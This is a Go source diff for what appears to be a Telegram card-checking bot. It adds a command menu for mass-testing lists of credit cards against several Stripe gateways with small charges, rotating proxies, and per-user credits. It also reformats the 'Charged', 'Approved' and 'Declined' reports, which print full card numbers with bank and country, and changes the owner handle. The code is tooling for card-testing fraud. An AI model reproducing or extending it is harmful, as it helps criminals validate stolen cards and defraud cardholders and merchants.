+		em(emojiCharged, "\xe2\x9c\x85") + "  /str &lt;cc list&gt;  /mstr &lt;cc list&gt;  /mstrtxt\n" +
+		"     Stripe Auth (UK, no charge)\n" +
+		"     Inline or mass-txt\n\n" +
+		em(emojiCharged, "\xe2\x9c\x85") + "  /str1 &lt;cc list&gt;  /mstr1 &lt;cc list&gt;  /mstr1txt\n" +
+		"     Stripe UHQ $1 GBP (checkout)\n" +
+		"     Inline or mass-txt\n\n" +
+		em(emojiCharged, "\xe2\x9c\x85") + "  /str2 &lt;cc list&gt;  /mstr2 &lt;cc list&gt;  /mstr2txt\n" +
+		"     Stripe UHQ $5 NZD (SecondStork)\n" +
+		"     Inline or mass-txt\n\n" +
+		em(emojiCharged, "\xe2\x9c\x85") + "  /str4 &lt;cc list&gt;  /mstr4 &lt;cc list&gt;  /mstr4txt\n" +
+		"     Stripe Donation $3 USD\n" +
+		"     Inline or mass-txt\n\n" +
+		em(emojiCharged, "\xe2\x9c\x85") + "  /str5 &lt;cc list&gt;  /mstr5 &lt;cc list&gt;  /mstr5txt\n" +
+		"     Stripe $1 USD\n" +
+		"     Inline or mass-txt\n\n" +
+		em(emojiCmdTxt, "\xe2\x9c\x85") + "  /txt\n" +
+		"     Reply to a .txt file to mass\n" +
+		"     check all cards inside it\n\n" +
+		em(emojiCmdSetpr, "\xe2\x9c\x85") + "  /setpr &lt;proxy&gt;\n" +
+		"     Add proxy(s) for checking\n" +
+		"     One per line, or a single proxy\n\n" +
+		em(emojiCmdRmpr, "\xe2\x9c\x85") + "  /rmpr &lt;proxy&gt;\n" +
+		"     Remove a specific proxy\n\n" +
+		em(emojiCmdRmpr, "\xe2\x9c\x85") + "  /rmpr all\n" +
+		"     Remove all saved proxies\n\n" +
+		em(emojiCmdStats, "\xe2\x9c\x85") + "  /stats\n" +
+		"     View your personal usage\n" +
+		"     stats and hit rates\n\n" +
+		em(emojiCmdActive, "\xe2\x9c\x85") + "  /active\n" +
+		"     See all users currently\n" +
+		"     checking with live progress\n\n" +
+		"====================\n" +
+		"  " + "\xe2\x9a\xa1" + " Powered By @SORRY_00001 " + em(emojiPwrStart, "\xe2\x9a\xa1") + "\n" +
+		"===================="
 }
 
 func formatProgressMsg(s *CheckSession) string {
@@ -633,25 +1009,27 @@ func formatProgressMsg(s *CheckSession) string {
 	approved := int(s.Approved.Load())
 	declined := int(s.Declined.Load())
 	errors := int(s.Errors.Load())
+	creditsUsed := charged*2 + approved
 	elapsed := time.Since(s.StartTime).Truncate(time.Second)
 
 	pgGw := s.GatewayName
 	if pgGw == "" {
 		pgGw = "AutoShopify Charge"
 	}
-	return em(emojiBlue, "🔵") + " <b><i>Checking...</i></b>\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		em(emojiBlue, "🔵") + " <b>Session ID</b> ⇒ <b>" + s.SessionID + "</b>\n" +
-		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + pgGw + "</b>\n" +
-		em(emojiDoc, "📋") + " <b>Total Cards</b> ⇒ <b>" + strconv.Itoa(total) + "</b>\n" +
-		em(emojiSearch, "🔍") + " <b>Checked</b> ⇒ <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
-		em(emojiCard, "💳") + " <b>Charged</b> ⇒ <b>" + strconv.Itoa(charged) + "</b>\n" +
-		em(emojiCheck, "✅") + " <b>Approved</b> ⇒ <b>" + strconv.Itoa(approved) + "</b>\n" +
-		em(emojiCross, "❌") + " <b>Declined</b> ⇒ <b>" + strconv.Itoa(declined) + "</b>\n" +
-		em(emojiWarn, "⚠️") + " <b>Error Cards</b> ⇒ <b>" + strconv.Itoa(errors) + "</b>\n" +
-		em(emojiClock, "⏱") + " <b>Time</b> ⇒ <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "⏱") + "\n" +
-		em(emojiUser, "👤") + " <b>Check By</b> ⇒ <b>@" + s.Username + "</b>\n" +
-		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi"
+	return em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b><i>Checking...</i></b>\n" +
+		"========================\n" +
+		em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b>Session ID</b> -> <b>" + html.EscapeString(s.SessionID) + "</b>\n" +
+		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(pgGw) + "</b>\n" +
+		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Total Cards</b> -> <b>" + strconv.Itoa(total) + "</b>\n" +
+		em(emojiSearch, "\xf0\x9f\x94\x8d") + " <b>Checked</b> -> <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
+		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Charged</b> -> <b>" + strconv.Itoa(charged) + "</b>\n" +
+		em(emojiCheck, "\xe2\x9c\x85") + " <b>Approved</b> -> <b>" + strconv.Itoa(approved) + "</b>\n" +
+		em(emojiCross, "\xe2\x9d\x8c") + " <b>Declined</b> -> <b>" + strconv.Itoa(declined) + "</b>\n" +
+		em(emojiWarn, "\xe2\x9a\xa0\xef\xb8\x8f") + " <b>Error Cards</b> -> <b>" + strconv.Itoa(errors) + "</b>\n" +
+		em(emojiPrice, "\xf0\x9f\x92\xb2") + " <b>Credits Used</b> -> <b>" + strconv.Itoa(creditsUsed) + "</b>\n" +
+		em(emojiClock, "\xe2\x8f\xb1") + " <b>Time</b> -> <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "\xe2\x8f\xb1") + "\n" +
+		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>Check By</b> -> <b>@" + html.EscapeString(s.Username) + "</b>\n" +
+		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
 }
 
 func formatCompletedMsg(s *CheckSession) string {
@@ -661,32 +1039,30 @@ func formatCompletedMsg(s *CheckSession) string {
 	approved := int(s.Approved.Load())
 	declined := int(s.Declined.Load())
 	errors := int(s.Errors.Load())
+	creditsUsed := charged*2 + approved
 	elapsed := time.Since(s.StartTime).Truncate(time.Millisecond * 100)
 
 	cmpGw := s.GatewayName
 	if cmpGw == "" {
 		cmpGw = "AutoShopify Charge"
 	}
-	return em(emojiCheck, "✅") + " <b><i>Completed</i></b> " + em(emojiCheck, "✅") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		em(emojiBlue, "🔵") + " <b>Session ID</b> ⇒ <b>" + s.SessionID + "</b>\n" +
-		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + cmpGw + "</b>\n" +
-		em(emojiDoc, "📋") + " <b>Total Cards</b> ⇒ <b>" + strconv.Itoa(total) + "</b>\n" +
-		em(emojiSearch, "🔍") + " <b>Checked</b> ⇒ <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
-		em(emojiCard, "💳") + " <b>Charged</b> ⇒ <b>" + strconv.Itoa(charged) + "</b>\n" +
-		em(emojiCheck, "✅") + " <b>Approved</b> ⇒ <b>" + strconv.Itoa(approved) + "</b>\n" +
-		em(emojiCross, "❌") + " <b>Declined</b> ⇒ <b>" + strconv.Itoa(declined) + "</b>\n" +
-		em(emojiWarn, "⚠️") + " <b>Error Cards</b> ⇒ <b>" + strconv.Itoa(errors) + "</b>\n" +
-		em(emojiClock, "⏱") + " <b>Time</b> ⇒ <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "⏱") + "\n" +
-		em(emojiUser, "👤") + " <b>Check By</b> ⇒ <b>@" + s.Username + "</b>\n" +
-		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi"
+	return em(emojiCheck, "\xe2\x9c\x85") + " <b><i>Completed</i></b> " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
+		"========================\n" +
+		em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b>Session ID</b> -> <b>" + html.EscapeString(s.SessionID) + "</b>\n" +
+		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(cmpGw) + "</b>\n" +
+		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Total Cards</b> -> <b>" + strconv.Itoa(total) + "</b>\n" +
+		em(emojiSearch, "\xf0\x9f\x94\x8d") + " <b>Checked</b> -> <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
+		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Charged</b> -> <b>" + strconv.Itoa(charged) + "</b>\n" +
+		em(emojiCheck, "\xe2\x9c\x85") + " <b>Approved</b> -> <b>" + strconv.Itoa(approved) + "</b>\n" +
+		em(emojiCross, "\xe2\x9d\x8c") + " <b>Declined</b> -> <b>" + strconv.Itoa(declined) + "</b>\n" +
+		em(emojiWarn, "\xe2\x9a\xa0\xef\xb8\x8f") + " <b>Error Cards</b> -> <b>" + strconv.Itoa(errors) + "</b>\n" +
+		em(emojiPrice, "\xf0\x9f\x92\xb2") + " <b>Credits Used</b> -> <b>" + strconv.Itoa(creditsUsed) + "</b>\n" +
+		em(emojiClock, "\xe2\x8f\xb1") + " <b>Time</b> -> <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "\xe2\x8f\xb1") + "\n" +
+		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>Check By</b> -> <b>@" + html.EscapeString(s.Username) + "</b>\n" +
+		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
 }
 
-func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
-	px := "●"
-	if proxyURL == "" {
-		px = "∅"
-	}
+func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
 	chGw := r.Gateway
 	if chGw == "" {
 		chGw = "Shopify Payments"
@@ -695,24 +1071,21 @@ func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username, proxy
 	if chResp == "" {
 		chResp = "ORDER_PLACED"
 	}
-	return "Charged\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"Card: " + card + "\n" +
-		"Gateway: " + chGw + "\n" +
-		"Response: " + chResp + "\n" +
-		"Price: " + r.Amount + "\n\n" +
-		"Brand: " + bin.Brand + "\n" +
-		"Bank: " + bin.Bank + "\n" +
-		"Country: " + bin.Country + "\n\n" +
-		"User: @" + username + "\n" +
-		"Proxy: " + px
+	return "<b><i>Charged</i></b> " + em(emojiCharged, "\xf0\x9f\x94\xa5") + "\n" +
+		"========================\n" +
+		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Card</b>\n" +
+		"-> <code>" + html.EscapeString(card) + "</code>\n" +
+		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(chGw) + "</b>\n" +
+		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Response</b> -> <b>" + html.EscapeString(chResp) + "</b>\n" +
+		em(emojiPrice, "\xf0\x9f\x92\xb2") + " <b>Price</b> -> <b>" + html.EscapeString(r.Amount) + "</b> " + em(emojiPrice, "\xf0\x9f\x92\xb2") + "\n\n" +
+		em(emojiBrand, "\xf0\x9f\x94\xb0") + " <b>Brand</b> -> <b>" + html.EscapeString(bin.Brand) + "</b>\n" +
+		em(emojiBank, "\xf0\x9f\x8f\xa6") + " <b>Bank</b> -> <b>" + html.EscapeString(bin.Bank) + "</b>\n" +
+		em(emojiGlobe, "\xf0\x9f\x8c\x8d") + " <b>Country</b> -> <b>" + html.EscapeString(bin.Country) + "</b> " + html.EscapeString(bin.CountryFlag) + "\n\n" +
+		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> <b>@" + html.EscapeString(username) + "</b>\n" +
+		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
 }
 
-func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
-	px := "●"
-	if proxyURL == "" {
-		px = "∅"
-	}
+func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
 	apGw := r.Gateway
 	if apGw == "" {
 		apGw = "Shopify Payments"
@@ -723,39 +1096,35 @@ func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username, prox
 	} else if r.StatusCode == "CARD_APPROVED" {
 		header = "Approved"
 	}
-	return "<b><i>" + header + "</i></b> " + em(emojiCheck, "✅") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		em(emojiCard, "💳") + " <b>Card</b>\n" +
-		"└ <code>" + card + "</code>\n" +
-		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + apGw + "</b>\n" +
-		em(emojiDoc, "📋") + " <b>Response</b> ⇒ <b>" + r.StatusCode + "</b>\n" +
-		em(emojiBrand, "🔰") + " <b>Brand</b> ⇒ <b>" + bin.Brand + "</b>\n" +
-		em(emojiBank, "🏦") + " <b>Bank</b> ⇒ <b>" + bin.Bank + "</b>\n" +
-		em(emojiGlobe, "🌍") + " <b>Country</b> ⇒ <b>" + bin.Country + "</b> " + bin.CountryFlag + "\n\n" +
-		em(emojiUser, "👤") + " <b>User</b> ⇒ <b>@" + username + "</b>\n" +
-		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi / " + em(emojiGlobe, "🌐") + " <b>Px</b> ⇒ " + px
+	return "<b><i>" + header + "</i></b> " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
+		"========================\n" +
+		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Card</b>\n" +
+		"-> <code>" + html.EscapeString(card) + "</code>\n" +
+		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(apGw) + "</b>\n" +
+		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Response</b> -> <b>" + html.EscapeString(r.StatusCode) + "</b>\n" +
+		em(emojiBrand, "\xf0\x9f\x94\xb0") + " <b>Brand</b> -> <b>" + html.EscapeString(bin.Brand) + "</b>\n" +
+		em(emojiBank, "\xf0\x9f\x8f\xa6") + " <b>Bank</b> -> <b>" + html.EscapeString(bin.Bank) + "</b>\n" +
+		em(emojiGlobe, "\xf0\x9f\x8c\x8d") + " <b>Country</b> -> <b>" + html.EscapeString(bin.Country) + "</b> " + html.EscapeString(bin.CountryFlag) + "\n\n" +
+		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> <b>@" + html.EscapeString(username) + "</b>\n" +
+		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
 }
 
-func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
-	px := "●"
-	if proxyURL == "" {
-		px = "∅"
-	}
+func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
 	dcGw := r.Gateway
 	if dcGw == "" {
 		dcGw = "Shopify Payments"
 	}
-	return "<b><i>Declined</i></b> " + em(emojiCross, "❌") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		em(emojiCard, "💳") + " <b>Card</b>\n" +
-		"└ <code>" + card + "</code>\n" +
-		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + dcGw + "</b>\n" +
-		em(emojiDoc, "📋") + " <b>Response</b> ⇒ <b>" + r.StatusCode + "</b>\n" +
-		em(emojiBrand, "🔰") + " <b>Brand</b> ⇒ <b>" + bin.Brand + "</b>\n" +
-		em(emojiBank, "🏦") + " <b>Bank</b> ⇒ <b>" + bin.Bank + "</b>\n" +
-		em(emojiGlobe, "🌍") + " <b>Country</b> ⇒ <b>" + bin.Country + "</b> " + bin.CountryFlag + "\n\n" +
-		em(emojiUser, "👤") + " <b>User</b> ⇒ <b>@" + username + "</b>\n" +
-		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi / " + em(emojiGlobe, "🌐") + " <b>Px</b> ⇒ " + px
+	return "<b><i>Declined</i></b> " + em(emojiCross, "\xe2\x9d\x8c") + "\n" +
+		"========================\n" +
+		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Card</b>\n" +
+		"-> <code>" + html.EscapeString(card) + "</code>\n" +
+		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(dcGw) + "</b>\n" +
+		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Response</b> -> <b>" + html.EscapeString(r.StatusCode) + "</b>\n" +
+		em(emojiBrand, "\xf0\x9f\x94\xb0") + " <b>Brand</b> -> <b>" + html.EscapeString(bin.Brand) + "</b>\n" +
+		em(emojiBank, "\xf0\x9f\x8f\xa6") + " <b>Bank</b> -> <b>" + html.EscapeString(bin.Bank) + "</b>\n" +
+		em(emojiGlobe, "\xf0\x9f\x8c\x8d") + " <b>Country</b> -> <b>" + html.EscapeString(bin.Country) + "</b> " + html.EscapeString(bin.CountryFlag) + "\n\n" +
+		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> <b>@" + html.EscapeString(username) + "</b>\n" +
+		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
 }
 
 func formatActiveMsg() string {
@@ -782,15 +1151,15 @@ func formatActiveMsg() string {
 	})
 
 	if len(entries) == 0 {
-		return "━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiCmdActive, "👥") + "  𝗔𝗰𝘁𝗶𝘃𝗲 𝗖𝗵𝗲𝗰𝗸𝘀\n━━━━━━━━━━━━━━━━━━━━━━\n\n" + em(emojiLive, "📡") + "  No active sessions\n\n━━━━━━━━━━━━━━━━━━━━━━"
+		return "\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n  " + em(emojiCmdActive, "\xf0\x9f\x91\xa5") + "  Active Sessions\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n\n" + em(emojiLive, "\xf0\x9f\x94\xb4") + "  No active sessions\n\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81"
 	}
 
 	sort.Slice(entries, func(i, j int) bool { return entries[i].Username < entries[j].Username })
 
 	var sb strings.Builder
-	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiCmdActive, "👥") + "  𝗔𝗰𝘁𝗶𝘃𝗲 𝗖𝗵𝗲𝗰𝗸𝘀\n━━━━━━━━━━━━━━━━━━━━━━\n\n")
-	sb.WriteString(fmt.Sprintf(em(emojiLive, "🔴")+"  %d users currently checking\n\n", len(entries)))
-	sb.WriteString("┌───────────────────────┐\n│                           │\n")
+	sb.WriteString("\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n  " + em(emojiCmdActive, "\xf0\x9f\x91\xa5") + "  Active Sessions\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n\n")
+	sb.WriteString(fmt.Sprintf(em(emojiLive, "\xf0\x9f\x94\xb4")+"  %d users currently checking\n\n", len(entries)))
+	sb.WriteString("\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n")
 	for i, e := range entries {
 		pct := 0
 		if e.Total > 0 {
@@ -798,19 +1167,19 @@ func formatActiveMsg() string {
 		}
 		barLen := 10
 		filled := barLen * e.Checked / max(e.Total, 1)
-		bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)
+		bar := strings.Repeat("#", filled) + strings.Repeat("-", barLen-filled)
 		h := int(e.Elapsed.Hours())
 		m := int(e.Elapsed.Minutes()) % 60
 		sc := int(e.Elapsed.Seconds()) % 60
-		sb.WriteString(fmt.Sprintf("│   %d. @%s\n", i+1, e.Username))
-		sb.WriteString(fmt.Sprintf("│      %s %3d%%\n", bar, pct))
-		sb.WriteString(fmt.Sprintf("│        %d / %d\n", e.Checked, e.Total))
-		sb.WriteString(fmt.Sprintf("│      "+em(emojiRowCard, "💳")+"  %d charged ∣ $%.2f\n", e.Charged, e.ChargedAmt))
-		sb.WriteString(fmt.Sprintf("│      "+em(emojiTime, "⏱")+" %02d:%02d:%02d\n", h, m, sc))
-		sb.WriteString("│                           │\n")
+		sb.WriteString(fmt.Sprintf("\xe2\x94\x82   %d. @%s\n", i+1, html.EscapeString(e.Username)))
+		sb.WriteString(fmt.Sprintf("\xe2\x94\x82      %s %3d%%\n", bar, pct))
+		sb.WriteString(fmt.Sprintf("\xe2\x94\x82        %d / %d\n", e.Checked, e.Total))
+		sb.WriteString(fmt.Sprintf("\xe2\x94\x82      "+em(emojiRowCard, "\xf0\x9f\x92\xb3")+"  %d charged | $%.2f\n", e.Charged, e.ChargedAmt))
+		sb.WriteString(fmt.Sprintf("\xe2\x94\x82      "+em(emojiTime, "\xe2\x8f\xb1")+" %02d:%02d:%02d\n", h, m, sc))
+		sb.WriteString("\xe2\x94\x82                           \xe2\x94\x82\n")
 	}
-	sb.WriteString("└───────────────────────┘\n\n")
-	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @aldorsi\n━━━━━━━━━━━━━━━━━━━━━━")
+	sb.WriteString("\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98\n\n")
+	sb.WriteString("\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n  " + em(emojiPwr, "\xe2\x9a\xa1") + " Powered By @SORRY_00001\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x80")
 	return sb.String()
 }
 
@@ -834,29 +1203,26 @@ func formatStatsMsg(um *UserManager) string {
 		approvedRate = float64(totalApproved) * 100.0 / float64(totalChecked)
 		chargedRate = float64(totalCharged) * 100.0 / float64(totalChecked)
 	}
-	return "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"    " + em(emojiCmdStats, "📊") + "  𝗚𝗹𝗼𝗯𝗮𝗹 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-		"┌────────────────────────────┐\n" +
-		"│                              │\n" +
-		fmt.Sprintf("│  "+em(emojiRowCheck, "📋")+"  Total Checked  ∣  %6d  │\n", totalChecked) +
-		fmt.Sprintf("│  "+em(emojiRowAppr, "✅")+"  Approved       ∣  %6d  │\n", totalApproved) +
-		fmt.Sprintf("│  "+em(emojiRowDecl, "❌")+"  Declined       ∣  %6d  │\n", totalDeclined) +
-		fmt.Sprintf("│  "+em(emojiRowCard, "💳")+"  Charged        ∣  %6d  │\n", totalCharged) +
-		"│                              │\n" +
-		"└────────────────────────────┘\n\n" +
-		em(emojiMoney, "💰") + "  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁\n" +
+	return "\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n" +
+		"    " + em(emojiCmdStats, "\xf0\x9f\x93\x8a") + "  Global Statistics\n" +
+		"\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n\n" +
+		"\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n" +
+		"\xe2\x94\x82                              \xe2\x94\x82\n" +
+		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowCheck, "\xe2\x9c\x85")+"  Total Checked  |  %6d  \xe2\x94\x82\n", totalChecked) +
